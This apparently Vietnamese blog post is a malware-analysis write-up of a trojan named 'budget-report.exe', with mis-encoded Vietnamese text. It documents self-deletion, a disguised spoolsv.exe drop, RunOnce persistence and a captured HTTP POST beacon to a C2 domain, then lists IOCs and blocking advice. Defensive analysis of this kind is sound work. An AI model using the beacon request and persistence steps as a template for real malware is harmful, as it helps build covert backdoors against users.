---
title: Budget-report.exe
date: 2025-6-25 08:30:00 +0700
categories: [Malware Analysis, Dynamic]
tags: [persistence, c2, trojan, backdoor]
description: PhÃ¢n tÃ­ch hÃ nh vi runtime cá»§a máº«u mÃ£ Ä‘á»™c budget-report.exe cÆ¡ cháº¿ persistence, káº¿t ná»‘i C2, vÃ  Ä‘Ã¡nh giÃ¡ kháº£ nÄƒng lÃ  backdoor/beacon trojan.
---

## ğŸ¯ Má»¥c tiÃªu

- Theo dÃµi hÃ nh vi runtime cá»§a máº«u `budget-report.exe`
- XÃ¡c Ä‘á»‹nh má»¥c tiÃªu, ká»¹ thuáº­t vÃ  Ä‘Ã¡nh giÃ¡ kháº£ nÄƒng gÃ¢y háº¡i
- Ghi nháº­n cÃ¡c IOC quan trá»ng (Indicators of Compromise)

---

## ğŸ§Š 1. PhÃ¢n tÃ­ch tÄ©nh

**TÃªn file**: `budget-report.exe`

**MD5**: `d7cc6c987c68a88defdab3a59070777e`

### ğŸ”¹ VirusTotal
![VirusTotal scan](/resources/Budget-report/Pasted image 20251001080419.png)

### ğŸ”¹ EXEinfoPE
- 32-bit, GUI, khÃ´ng bá»‹ pack

![EXEinfoPE](/resources/Budget-report/Pasted image 20251001073557.png)

### ğŸ”¹ PeStudio

#### ğŸ“Œ Indicators
![PeStudio Indicators](/resources/Budget-report/Pasted image 20251001073819.png)

- Sá»­ dá»¥ng thÆ° viá»‡n liÃªn quan Ä‘áº¿n **Internet** vÃ  **Sockets**
- CÃ³ nhiá»u hÃ m import (â‰ˆ54), khÃ¡ nhiá»u so vá»›i má»™t GUI Ä‘Æ¡n giáº£n

#### ğŸ“Œ Strings
![PeStudio Strings](/resources/Budget-report/Pasted image 20251001074032.png)

- Nhiá»u chuá»—i kháº£ nghi: `GetUserName`, `InternetOpen`, `CreateKey`, tÃªn file `spoolsv.exe`, chuá»—i liÃªn quan socket/process/registry...

#### ğŸ“Œ IAT â€“ Báº£ng hÃ m nháº­p
![IAT view](/resources/Budget-report/Pasted image 20251001074327.png)

- Nhiá»u API liÃªn quan máº¡ng, registry, process â†’ gá»£i Ã½ hÃ nh vi persistence + network.

---

## âš™ï¸ 2. PhÃ¢n tÃ­ch Ä‘á»™ng

### ğŸ”¸ 1. XÃ³a chÃ­nh nÃ³ sau khi cháº¡y

Ngay khi khá»Ÿi cháº¡y, file gá»‘c `budget-report.exe` bá»‹ xÃ³a khá»i á»• Ä‘Ä©a (self-delete).

---

### ğŸ”¸ 2. Káº¿t ná»‘i máº¡ng (Fakenet)

Máº«u gá»­i HTTP POST vá» má»™t Ä‘á»‹a chá»‰ C2:

```http
POST /uan9Bau3LJ9/ HTTP/1.1
Host: mbaquyahcn.biz:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2...)

Body:
a=&b=&c=%67%61%78%79%79%76%76%76%73%74%47%71%71%6E%72%6F%6F%66%6C%6C%6A
````


âœ… Payload `c=` sau khi decode ra chuá»—i cÃ³ váº» ngáº«u nhiÃªn (`gaxyvvvstGqqnroofllj`) â†’ cÃ³ thá»ƒ lÃ  ID há»‡ thá»‘ng hoáº·c token Ä‘á»‹nh danh.

> Máº«u gá»­i láº¡i gÃ³i nÃ y nhiá»u láº§n â€” cÃ³ thá»ƒ chá» pháº£n há»“i tá»« mÃ¡y chá»§ C2 Ä‘á»ƒ nháº­n lá»‡nh tiáº¿p theo (beacon behaviour).

---

### ğŸ”¸ 3. Theo dÃµi registry báº±ng Regshot

![Regshot diff](/resources/Budget-report/Pasted image 20251001081102.png)

Má»™t sá»‘ key Ä‘Ã¡ng chÃº Ã½:

```reg
HKCU\SOFTWARE\12648430                   â†’ chá»©a chuá»—i hash Ä‘á»‹nh danh
HKCU\...\RunOnce\*12648430               â†’ khá»Ÿi Ä‘á»™ng spoolsv.exe khi mÃ¡y báº­t láº¡i
HKCU\...\AppData\Roaming\12648430\spoolsv.exe â†’ file copy chÃ­nh mÃ£ Ä‘á»™c
```

ğŸ“ **HÃ nh vi chÃ­nh:**

* XÃ³a file gá»‘c `budget-report.exe`
* Táº¡o `spoolsv.exe` táº¡i `AppData\Roaming\12648430` (drop & copy)
* Ghi vÃ o registry `RunOnce` Ä‘á»ƒ **tá»± Ä‘á»™ng khá»Ÿi Ä‘á»™ng láº¡i sau reboot**

---

### ğŸ”¸ 4. ProcMon theo dÃµi chi tiáº¿t

![ProcMon timeline](/resources/Budget-report/budget-report.png)

Timeline ProcMon xÃ¡c nháº­n chuá»—i hÃ nh Ä‘á»™ng:

* Äá»c user profile
* Táº¡o thÆ° má»¥c trong AppData
* Copy chÃ­nh nÃ³ thÃ nh `spoolsv.exe`
* Ghi registry RunOnce
* Gá»­i HTTP request ra ngoÃ i (beacon)

---

## ğŸš¨ Káº¿t luáº­n

### âœ… TÃ³m táº¯t hÃ nh vi

* **Táº¡o persistence** qua RunOnce â†’ Ä‘áº£m báº£o cháº¡y láº¡i sau khá»Ÿi Ä‘á»™ng
* **LiÃªn láº¡c vá»›i C2**: `mbaquyahcn.biz` trÃªn cá»•ng 80 (POST `/uan9Bau3LJ9/`)
* **XÃ³a file gá»‘c** vÃ  **drop file má»›i** (`spoolsv.exe`) Ä‘á»ƒ khÃ³ bá»‹ phÃ¡t hiá»‡n

### ğŸ¯ Má»¥c tiÃªu & Ã nghÄ©a

| HÃ nh vi            | Má»¥c tiÃªu                              |
| ------------------ | ------------------------------------- |
| Registry RunOnce   | Giá»¯ sá»± hiá»‡n diá»‡n lÃ¢u dÃ i              |
| HTTP POST C2       | BÃ¡o vá» mÃ¡y & chá» chá»‰ thá»‹ tá»« C2        |
| XÃ³a file gá»‘c       | TrÃ¡nh bá»‹ phÃ¢n tÃ­ch                    |
| Drop `spoolsv.exe` | Ngá»¥y trang dÆ°á»›i tÃªn tiáº¿n trÃ¬nh há»£p lá»‡ |

### ğŸ” Kháº£ nÄƒng gÃ¢y háº¡i

* Kháº£ nÄƒng cao lÃ  **backdoor Ä‘Æ¡n giáº£n** / **beacon trojan**
* Gá»­i Ä‘á»‹nh danh ban Ä‘áº§u vá» C2 Ä‘á»ƒ chá» lá»‡nh â€” háº¡ táº§ng Ä‘Ã£ sáºµn sÃ ng cho Ä‘iá»u khiá»ƒn tá»« xa
* ChÆ°a tháº¥y hÃ nh vi rÃµ rÃ ng vá» Ä‘Ã¡nh cáº¯p dá»¯ liá»‡u hay phÃ¡ hoáº¡i, nhÆ°ng kháº£ nÄƒng má»Ÿ rá»™ng hÃ nh vi tá»“n táº¡i náº¿u C2 tráº£ lá»‡nh

---

## ğŸ“Œ IOC (Indicators of Compromise)

| Loáº¡i         | GiÃ¡ trá»‹                                                  |
| ------------ | -------------------------------------------------------- |
| File hash    | `d7cc6c987c68a88defdab3a59070777e`                       |
| C2 domain    | `mbaquyahcn.biz`                                         |
| C2 path      | `/uan9Bau3LJ9/`                                          |
| File drop    | `C:\Users\<user>\AppData\Roaming\12648430\spoolsv.exe`   |
| Registry key | `HKCU\...\RunOnce\*12648430`                             |
| UA giáº£       | `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2;...)` |

---

> ğŸ›¡ï¸ **Khuyáº¿n nghá»‹:**
>
> * Cháº·n domain `mbaquyahcn.biz` á»Ÿ proxy/IDS/Firewall.
> * QuÃ©t & cÃ¡ch ly cÃ¡c file cÃ³ Ä‘Æ°á»ng dáº«n giá»‘ng `AppData\Roaming\12648430\spoolsv.exe`.
> * GiÃ¡m sÃ¡t registry Run/RunOnce cho entry láº¡ dáº¡ng `*12648430`.
> * Náº¿u phÃ¡t hiá»‡n, thu tháº­p memory dump & network capture Ä‘á»ƒ phÃ¢n tÃ­ch sÃ¢u (Ä‘á»ƒ xÃ¡c Ä‘á»‹nh lá»‡nh tiáº¿p theo tá»« C2).

---
